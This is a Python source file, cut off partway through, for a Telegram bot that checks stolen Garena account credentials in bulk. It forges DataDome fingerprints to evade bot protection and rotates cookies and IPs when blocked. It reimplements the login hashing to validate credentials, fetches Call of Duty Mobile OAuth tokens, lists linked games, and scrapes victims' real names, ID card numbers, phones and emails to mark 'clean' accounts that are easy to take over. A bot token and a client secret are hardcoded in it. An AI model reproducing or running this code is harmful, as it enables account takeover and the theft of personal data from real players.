# DON'T SHARE THIS SOURCE TO ANYONE NIGGA 

import asyncio
import io
import os
import sys
import time
import random
import hashlib
import json
import logging
import urllib.parse
import threading
from datetime import datetime, timezone
from threading import Lock, Event

from Crypto.Cipher import AES
import requests
import cloudscraper

from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    CallbackContext,
)

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)
logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

BOT_TOKEN = "8786306697:AAEPSnuUuFK8xlGShs2jOMf3s7hkKNePjYg" #lagay mo bot token mo 
ADMIN_IDS = [6854608129] #id naman Dito 

DATA_FILE = "bot_data.json"
_data_lock = threading.Lock()


def _load_data() -> dict:
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {"approved": [], "removed": [], "pending": {}}

def _save_data(data: dict):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)

def _get_data() -> dict:
    with _data_lock:
        return _load_data()

def _mutate(fn):
    with _data_lock:
        d = _load_data()
        fn(d)
        _save_data(d)

def is_approved(uid: int) -> bool:
    if uid in ADMIN_IDS:
        return True
    d = _get_data()
    return uid in d["approved"] and uid not in d["removed"]

def is_removed(uid: int) -> bool:
    return uid in _get_data()["removed"]

def has_pending(uid: int) -> bool:
    return str(uid) in _get_data()["pending"]

def get_pending() -> dict:
    return _get_data()["pending"]

def get_approved() -> list:
    return _get_data()["approved"]

def get_removed() -> list:
    return _get_data()["removed"]

def add_pending(uid: int, info: dict):
    _mutate(lambda d: d["pending"].__setitem__(str(uid), info))

def approve_user(uid: int):
    def fn(d):
        if uid not in d["approved"]:
            d["approved"].append(uid)
        if uid in d["removed"]:
            d["removed"].remove(uid)
        d["pending"].pop(str(uid), None)
    _mutate(fn)

def decline_user(uid: int):
    _mutate(lambda d: d["pending"].pop(str(uid), None))

def remove_user(uid: int):
    def fn(d):
        if uid in d["approved"]:
            d["approved"].remove(uid)
        if uid not in d["removed"]:
            d["removed"].append(uid)
        d["pending"].pop(str(uid), None)
    _mutate(fn)



def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode("utf-8")).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if "=" in item:
            try:
                key, value = item.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value
            except Exception:
                pass
    if cookie_dict:
        session.cookies.update(cookie_dict)



class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.load_banned_cookies()

    def load_banned_cookies(self):
        if os.path.exists("banned_cookies.txt"):
            with open("banned_cookies.txt", "r") as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())

    def is_banned(self, cookie):
        return cookie in self.banned_cookies

    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open("banned_cookies.txt", "a") as f:
            f.write(cookie + "\n")

    def get_valid_cookies(self):
        valid_cookies = []
        if os.path.exists("fresh_cookie.txt"):
            with open("fresh_cookie.txt", "r") as f:
                valid_cookies = [c.strip() for c in f.read().splitlines()
                                 if c.strip() and not self.is_banned(c.strip())]
        random.shuffle(valid_cookies)
        return valid_cookies

    def save_cookie(self, datadome_value):
        formatted_cookie = f"datadome={datadome_value.strip()}"
        if not self.is_banned(formatted_cookie):
            existing_cookies = set()
            if os.path.exists("fresh_cookie.txt"):
                with open("fresh_cookie.txt", "r") as f:
                    existing_cookies = set(line.strip() for line in f if line.strip())
            if formatted_cookie not in existing_cookies:
                with open("fresh_cookie.txt", "a") as f:
                    f.write(formatted_cookie + "\n")
                return True
        return False



class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        self._blocked = False

    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)

    def get_datadome(self):
        return self.current_datadome

    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get("datadome")
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception:
            return None

    def clear_session_datadome(self, session):
        try:
            if "datadome" in session.cookies:
                del session.cookies["datadome"]
        except Exception:
            pass

    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set("datadome", cookie_to_use, domain=".garena.com")
                return True
            return False
        except Exception:
            return False

    def get_current_ip(self):
        ip_services = [
            "https://api.ipify.org",
            "https://icanhazip.com",
            "https://ident.me",
            "https://checkip.amazonaws.com",
        ]
        for service in ip_services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and "." in ip:
                        return ip
            except Exception:
                continue
        return None

    def fetch_fresh_datadome_with_retry(self, session, max_retries=5):
        attempt = 0
        while True:
            attempt += 1
            try:
                fresh_session = cloudscraper.create_scraper()
                new_datadome = get_datadome_cookie(fresh_session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    self.set_session_datadome(session, new_datadome)
                    return True
            except Exception:
                pass
            time.sleep(5)

    def wait_for_ip_change(self, session, check_interval=5):
        original_ip = self.get_current_ip()
        if not original_ip:
            time.sleep(10)
            return self.fetch_fresh_datadome_with_retry(session)
        attempts = 0
        while True:
            attempts += 1
            current_ip = self.get_current_ip()
            if current_ip and current_ip != original_ip:
                return self.fetch_fresh_datadome_with_retry(session)
            time.sleep(check_interval)

    def handle_403(self, session):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            self._blocked = True
            if self.wait_for_ip_change(session):
                self._403_attempts = 0
                self._blocked = False
                return True
            return False
        else:
            if self.fetch_fresh_datadome_with_retry(session, max_retries=3):
                return False
        return False

    def is_blocked(self):
        return self._blocked

    def reset_attempts(self):
        self._403_attempts = 0
        self._blocked = False



class LiveStats:
    GAME_KEYS = ["CODM", "FREEFIRE", "ROV", "DELTA FORCE", "AOV",
                 "SPEED DRIFTERS", "BLACK CLOVER M", "GARENA UNDAWN",
                 "FC ONLINE", "FC ONLINE M", "MOONLIGHT BLADE",
                 "FAST THRILL", "THE WORLD OF WAR"]

    def __init__(self):
        self.valid_count       = 0
        self.invalid_count     = 0
        self.clean_count       = 0
        self.not_clean_count   = 0
        self.has_codm_count    = 0
        self.no_codm_count     = 0
        self.total_processed   = 0
        self.highest_level     = 0
        self.highest_clean_level = 0
        self.game_counts       = {g: 0 for g in self.GAME_KEYS}
        self.lock              = threading.Lock()

    def update_stats(self, valid=False, clean=False, has_codm=False,
                     codm_level=None, game_connections=None):
        with self.lock:
            self.total_processed += 1
            if valid:
                self.valid_count += 1
                if clean:
                    self.clean_count += 1
                    if codm_level and codm_level > self.highest_clean_level:
                        self.highest_clean_level = codm_level
                else:
                    self.not_clean_count += 1
                if has_codm:
                    self.has_codm_count += 1
                    if codm_level and codm_level > self.highest_level:
                        self.highest_level = codm_level
                else:
                    self.no_codm_count += 1
                if game_connections:
                    for g in game_connections:
                        gname = g.get("game", "").upper()
                        if gname == "FREE FIRE":
                            gname = "FREEFIRE"
                        if gname in self.game_counts:
                            self.game_counts[gname] += 1
            else:
                self.invalid_count += 1

    def get_stats(self):
        with self.lock:
            return {
                "valid":               self.valid_count,
                "invalid":             self.invalid_count,
                "clean":               self.clean_count,
                "not_clean":           self.not_clean_count,
                "has_codm":            self.has_codm_count,
                "no_codm":             self.no_codm_count,
                "total":               self.total_processed,
                "highest_level":       self.highest_level,
                "highest_clean_level": self.highest_clean_level,
                "game_counts":         dict(self.game_counts),
            }



def get_datadome_from_file():
    banned = set()
    if os.path.exists("banned_cookies.txt"):
        with open("banned_cookies.txt", "r") as f:
            banned = set(line.strip() for line in f if line.strip())
    if os.path.exists("fresh_cookie.txt"):
        with open("fresh_cookie.txt", "r") as f:
            cookies = [line.strip() for line in f if line.strip() and line.strip() not in banned]
        if cookies:
            entry = random.choice(cookies)
            if "=" in entry:
                return entry.split("=", 1)[1].strip()
    return None


def get_datadome_cookie(session):
    url = "https://dd.garena.com/js/"
    headers = {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://account.garena.com",
        "pragma": "no-cache",
        "referer": "https://account.garena.com/",
        "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    }
    payload = {
        "jsData": json.dumps({
            "ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536,
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False,
            "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864,
            "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US",
            "pr": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True,
            "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True,
            "plgre": True, "plgof": False, "plggt": False, "pltod": False, "hcovdr": False,
            "hcovdr2": False, "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False,
            "lb": False, "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False,
            "vnd": "Google Inc.", "bid": "NA",
            "mmt": "application/pdf,text/pdf",
            "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
            "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined",
            "aco": "probably", "acots": False, "acmp": "probably", "acmpts": True,
            "acw": "probably", "acwts": False, "acma": "maybe", "acmats": False,
            "acaa": "probably", "acaats": True, "ac3": "", "ac3ts": False, "acf": "probably",
            "acfts": False, "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably",
            "acmp3ts": False, "acwm": "maybe", "acwmts": False, "ocpt": False, "vco": "",
            "vcots": False, "vch": "probably", "vchts": True, "vcw": "probably", "vcwts": True,
            "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False, "vcq": "maybe",
            "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False,
            "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True,
            "cvs": True, "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True,
        }),
        "eventCounters": "[]",
        "jsType": "ch",
        "cid": "KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae",
        "ddk": "AE3F04AD3F0D3A462481A337485081",
        "Referer": "https://account.garena.com/",
        "request": "/",
        "responsePage": "origin",
        "ddv": "4.35.4",
    }
    data = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in payload.items())
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        response_json = response.json()
        if response_json.get("status") == 200 and "cookie" in response_json:
            cookie_string = response_json["cookie"]
            datadome = cookie_string.split(";")[0].split("=")[1]
            return datadome
    except Exception:
        pass

    fallback = get_datadome_from_file()
    if fallback:
        return fallback

    return None



def prelogin(session, account, datadome_manager):
    try:
        account.encode("latin-1")
    except UnicodeEncodeError:
        return None, None, None

    url = "https://sso.garena.com/api/prelogin"
    params = {
        "app_id": "10100",
        "account": account,
        "format": "json",
        "id": str(int(time.time() * 1000)),
    }
    retries = 3
    for attempt in range(retries):
        try:
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name in ["apple_state_key", "datadome", "sso_key"]:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            cookie_header = "; ".join(cookie_parts) if cookie_parts else ""
            headers = {
                "accept": "application/json, text/plain, */*",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "connection": "keep-alive",
                "host": "sso.garena.com",
                "referer": f"https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}",
                "sec-ch-ua": '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
            }
            if cookie_header:
                headers["cookie"] = cookie_header
            response = session.get(url, headers=headers, params=params, timeout=30)

            new_cookies = {}
            if "set-cookie" in response.headers:
                for cookie_str in response.headers["set-cookie"].split(","):
                    if "=" in cookie_str:
                        try:
                            cname = cookie_str.split("=")[0].strip()
                            cvalue = cookie_str.split("=")[1].split(";")[0].strip()
                            if cname and cvalue:
                                new_cookies[cname] = cvalue
                        except Exception:
                            pass
            try:
                for cn, cv in response.cookies.get_dict().items():
                    if cn not in new_cookies:
                        new_cookies[cn] = cv
            except Exception:
                pass
            for cn, cv in new_cookies.items():
                if cn in ["datadome", "apple_state_key", "sso_key"]:
                    session.cookies.set(cn, cv, domain=".garena.com")
                    if cn == "datadome":
                        datadome_manager.set_datadome(cv)
            new_datadome = new_cookies.get("datadome")

            if response.status_code == 403:
                if new_cookies and attempt < retries - 1:
                    time.sleep(2)
                    continue
                if datadome_manager.handle_403(session):
                    return "IP_BLOCKED", None, None
                return None, None, new_datadome

            response.raise_for_status()

            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return None, None, new_datadome
            if "error" in data:
                return None, None, new_datadome
            v1 = data.get("v1")
            v2 = data.get("v2")
            if not v1 or not v2:
                return None, None, new_datadome
            return v1, v2, new_datadome

        except requests.exceptions.HTTPError as e:
            if hasattr(e, "response") and e.response is not None:
                if e.response.status_code == 403:
                    new_cookies = {}
                    if "set-cookie" in e.response.headers:
                        for cookie_str in e.response.headers["set-cookie"].split(","):
                            if "=" in cookie_str:
                                try:
                                    cn = cookie_str.split("=")[0].strip()
                                    cv = cookie_str.split("=")[1].split(";")[0].strip()
                                    if cn and cv:
                                        new_cookies[cn] = cv
                                        session.cookies.set(cn, cv, domain=".garena.com")
                                        if cn == "datadome":
                                            datadome_manager.set_datadome(cv)
                                except Exception:
                                    pass
                    if new_cookies and attempt < retries - 1:
                        time.sleep(2)
                        continue
                    if datadome_manager.handle_403(session):
                        return "IP_BLOCKED", None, None
                    return None, None, new_cookies.get("datadome")
            if attempt < retries - 1:
                time.sleep(2)
                continue
        except Exception:
            if attempt < retries - 1:
                time.sleep(2)
    return None, None, None


def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = "https://sso.garena.com/api/login"
    params = {
        "app_id": "10100",
        "account": account,
        "password": hashed_password,
        "redirect_uri": "https://account.garena.com/",
        "format": "json",
        "id": str(int(time.time() * 1000)),
    }
    current_cookies = session.cookies.get_dict()
    cookie_parts = []
    for cookie_name in ["apple_state_key", "datadome", "sso_key"]:
        if cookie_name in current_cookies:
            cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
    cookie_header = "; ".join(cookie_parts) if cookie_parts else ""
    headers = {
        "accept": "application/json, text/plain, */*",
        "referer": "https://account.garena.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36",
    }
    if cookie_header:
        headers["cookie"] = cookie_header
    retries = 3
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()
            login_cookies = {}
            if "set-cookie" in response.headers:
                for cookie_str in response.headers["set-cookie"].split(","):
                    if "=" in cookie_str:
                        try:
                            cn = cookie_str.split("=")[0].strip()
                            cv = cookie_str.split("=")[1].split(";")[0].strip()
                            if cn and cv:
                                login_cookies[cn] = cv
                        except Exception:
                            pass
            try:
                for cn, cv in response.cookies.get_dict().items():
                    if cn not in login_cookies:
                        login_cookies[cn] = cv
            except Exception:
                pass
            for cn, cv in login_cookies.items():
                if cn in ["sso_key", "apple_state_key", "datadome"]:
                    session.cookies.set(cn, cv, domain=".garena.com")
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(0.5)
                    continue
                return None
            if "error" in data:
                return None
            sso_key = login_cookies.get("sso_key") or response.cookies.get("sso_key")
            return sso_key
        except requests.RequestException:
            if attempt < retries - 1:
                time.sleep(2)
    return None



def get_codm_access_token(session):
    try:
        import uuid
        random_id = str(int(time.time() * 1000))
        grant_url = "https://100082.connect.garena.com/oauth/token/grant"
        grant_headers = {
            "Host": "100082.connect.garena.com",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": '"Android"',
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://100082.connect.garena.com",
            "X-Requested-With": "com.garena.game.codm",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
        }
        device_id = f"02-{str(uuid.uuid4())}"
        grant_data = f"client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}"
        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=15)
        grant_json = grant_response.json()
        auth_code = grant_json.get("code", "")
        if not auth_code:
            return "", "", ""
        token_url = "https://100082.connect.garena.com/oauth/token/exchange"
        token_headers = {
            "User-Agent": "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "100082.connect.garena.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
        }
        token_data = f"grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
        token_json = token_response.json()
        access_token = token_json.get("access_token", "")
        open_id = token_json.get("open_id", "")
        uid = token_json.get("uid", "")
        return access_token, open_id, uid
    except Exception:
        return "", "", ""


def process_codm_callback(session, access_token, open_id=None, uid=None):
    try:
        old_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        old_headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "referer": "https://auth.garena.com/",
        }
        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=15)
        location = old_response.headers.get("Location", "")
        if "err=3" in location:
            return None, "no_codm"
        elif "token=" in location:
            token = location.split("token=")[-1].split("&")[0]
            return token, "success"
        aos_callback_url = f"https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        aos_headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36",
            "referer": "https://100082.connect.garena.com/",
            "x-requested-with": "com.garena.game.codm",
        }
        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=15)
        aos_location = aos_response.headers.get("Location", "")
        if "err=3" in aos_location:
            return None, "no_codm"
        elif "token=" in aos_location:
            token = aos_location.split("token=")[-1].split("&")[0]
            return token, "success"
        return None, "unknown_error"
    except Exception:
        return None, "error"


def get_codm_user_info(session, token):
    try:
        import base64
        parts = token.split(".")
        if len(parts) == 3:
            payload = parts[1]
            padding = 4 - len(payload) % 4
            if padding != 4:
                payload += "=" * padding
            decoded = base64.urlsafe_b64decode(payload)
            jwt_data = json.loads(decoded)
            user_data = jwt_data.get("user", {})
            if user_data:
                return {
                    "codm_nickname": user_data.get("codm_nickname", user_data.get("nickname", "N/A")),
                    "codm_level": user_data.get("codm_level", "N/A"),
                    "region": user_data.get("region", "N/A"),
                    "uid": user_data.get("uid", "N/A"),
                    "open_id": user_data.get("open_id", "N/A"),
                    "t_open_id": user_data.get("t_open_id", "N/A"),
                }
    except Exception:
        pass
    try:
        url = "https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/"
        headers = {
            "accept": "application/json, text/plain, */*",
            "codm-delete-token": token,
            "origin": "https://delete-request-aos.codm.garena.co.id",
            "referer": "https://delete-request-aos.codm.garena.co.id/",
            "user-agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36",
            "x-requested-with": "com.garena.game.codm",
        }
        response = session.get(url, headers=headers, timeout=15)
        data = response.json()
        user_data = data.get("user", {})
        if user_data:
            return {
                "codm_nickname": user_data.get("codm_nickname", "N/A"),
                "codm_level": user_data.get("codm_level", "N/A"),
                "region": user_data.get("region", "N/A"),
                "uid": user_data.get("uid", "N/A"),
                "open_id": user_data.get("open_id", "N/A"),
                "t_open_id": user_data.get("t_open_id", "N/A"),
            }
        return {}
    except Exception:
        return {}


def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    try:
        access_token, open_id, uid = get_codm_access_token(session)
        if not access_token:
            return has_codm, codm_info
        codm_token, status = process_codm_callback(session, access_token, open_id, uid)
        if status == "no_codm":
            return has_codm, codm_info
        elif status != "success" or not codm_token:
            return has_codm, codm_info
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
    except Exception:
        pass
    return has_codm, codm_info


def get_game_connections(session, account):
    game_info = []
    valid_regions = {'sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'}

    game_mappings = {
        'tw': {
            "100082": "CODM",
            "100067": "FREE FIRE",
            "100070": "SPEED DRIFTERS",
            "100130": "BLACK CLOVER M",
            "100105": "GARENA UNDAWN",
            "100050": "ROV",
            "100151": "DELTA FORCE",
            "100147": "FAST THRILL",
            "100107": "MOONLIGHT BLADE",
        },
        'th': {
            "100067": "FREEFIRE",
            "100055": "ROV",
            "100082": "CODM",
            "100151": "DELTA FORCE",
            "100105": "GARENA UNDAWN",
            "100130": "BLACK CLOVER M",
            "100070": "SPEED DRIFTERS",
            "32836": "FC ONLINE",
            "100071": "FC ONLINE M",
            "100124": "MOONLIGHT BLADE",
        },
        'vn': {
            "32837": "FC ONLINE",
            "100072": "FC ONLINE M",
            "100054": "ROV",
            "100137": "THE WORLD OF WAR",
        },
        'default': {
            "100082": "CODM",
            "100067": "FREEFIRE",
            "100151": "DELTA FORCE",
            "100105": "GARENA UNDAWN",
            "100057": "AOV",
            "100070": "SPEED DRIFTERS",
            "100130": "BLACK CLOVER M",
            "100055": "ROV",
        }
    }

    try:
        token_url = "https://authgop.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}"
        try:
            token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=30)
            token_json = token_response.json()
            access_token = token_json.get("access_token", "")
        except Exception:
            return []
        if not access_token:
            return []

        inspect_url = "https://shop.garena.sg/api/auth/inspect_token"
        inspect_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json",
        }
        inspect_data_body = {"token": access_token}
        try:
            inspect_response = session.post(inspect_url, headers=inspect_headers, json=inspect_data_body, timeout=30)
            inspect_json = inspect_response.json()
        except Exception:
            return []

        session_key_roles = inspect_response.cookies.get('session_key')
        if not session_key_roles:
            return []

        uac = inspect_json.get("uac", "ph").lower()
        region = uac if uac in valid_regions else 'ph'

        if region in ('th', 'in'):
            base_domain = "termgame.com"
        elif region == 'id':
            base_domain = "kiosgamer.co.id"
        elif region == 'vn':
            base_domain = "napthe.vn"
        else:
            base_domain = f"shop.garena.{region}"

        applicable_games = game_mappings.get(region, game_mappings['default'])

        for app_id, game_name in applicable_games.items():
            roles_url = f"https://{base_domain}/api/shop/apps/roles"
            params_roles = {'app_id': app_id}
            headers_roles = {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                'Accept': "application/json, text/plain, */*",
                'Referer': f"https://{base_domain}/?app={app_id}",
                'Cookie': f"session_key={session_key_roles}",
            }
            try:
                roles_response = session.get(roles_url, params=params_roles, headers=headers_roles, timeout=30)
                try:
                    roles_data = roles_response.json()
                except Exception:
                    continue

                role = None
                if isinstance(roles_data.get("role"), list) and roles_data["role"]:
                    role = roles_data["role"][0]
                elif app_id in roles_data and isinstance(roles_data[app_id], list) and roles_data[app_id]:
                    candidate = roles_data[app_id][0]
                    if isinstance(candidate, dict):
                        role = candidate.get("role") or candidate.get("user_id") or None
                    else:
                        role = str(candidate)
                elif isinstance(roles_data, list) and roles_data:
                    first = roles_data[0]
                    if isinstance(first, dict) and first.get("role"):
                        role = first.get("role")

                if role:
                    game_info.append({'region': region.upper(), 'game': game_name, 'role': str(role)})
            except Exception:
                continue

    except Exception:
        pass
    return game_info



def parse_account_details(data):
    user_info = data.get("user_info", {})
    account_info = {
        "uid": user_info.get("uid", "N/A"),
        "username": user_info.get("username", "N/A"),
        "nickname": user_info.get("nickname", "N/A"),
        "email": user_info.get("email", "N/A"),
        "email_verified": bool(user_info.get("email_v", 0)),
        "security": {
            "password_strength": user_info.get("password_s", "N/A"),
            "two_step_verify": bool(user_info.get("two_step_verify_enable", 0)),
            "authenticator_app": bool(user_info.get("authenticator_enable", 0)),
            "facebook_connected": bool(user_info.get("is_fbconnect_enabled", False)),
            "facebook_account": user_info.get("fb_account", None),
            "suspicious": bool(user_info.get("suspicious", False)),
        },
        "personal": {
            "real_name": user_info.get("realname", "N/A"),
            "id_card": user_info.get("idcard", "N/A"),
            "country": user_info.get("acc_country", "N/A"),
            "country_code": user_info.get("country_code", "N/A"),
            "mobile_no": user_info.get("mobile_no", "N/A"),
        },
        "profile": {
            "avatar": user_info.get("avatar", "N/A"),
            "shell_balance": user_info.get("shell", 0),
        },
        "status": {
            "account_status": "Active" if user_info.get("status", 0) == 1 else "Inactive",
        },
        "binds": [],
    }
    email = account_info["email"]
    if email != "N/A" and email and not email.startswith("***") and "@" in email and "****" not in email:
        account_info["binds"].append("Email")
    mobile_no = account_info["personal"]["mobile_no"]
    if mobile_no != "N/A" and mobile_no and str(mobile_no).strip():
        account_info["binds"].append("Phone")
    if account_info["security"]["facebook_connected"]:
        account_info["binds"].append("Facebook")
    id_card = account_info["personal"]["id_card"]
    if id_card != "N/A" and id_card and str(id_card).strip():
        account_info["binds"].append("ID Card")
    if user_info.get("email_v", 0) == 1 or len(account_info["binds"]) > 0:
        account_info["is_clean"] = False
        account_info["bind_status"] = f"Bound ({', '.join(account_info['binds']) or 'Email Verified'})"
    else:
        account_info["is_clean"] = True
        account_info["bind_status"] = "Clean"
    return account_info


def _yn(val):
